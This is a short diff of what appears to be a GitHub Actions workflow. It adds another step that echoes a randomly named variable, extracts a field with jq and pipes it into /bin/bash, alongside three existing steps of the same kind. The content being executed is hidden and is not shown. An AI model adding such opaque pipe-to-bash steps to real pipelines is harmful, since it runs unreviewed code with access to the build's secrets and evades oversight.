@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$hpmbi50" | jq -r .buti5 | /bin/bash
           echo $dly914 | jq -r .zlg28 | /bin/bash
           echo $eima4 | jq -r .hqsb846 | /bin/bash
+          echo $qor487 | jq -r .drfa0 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
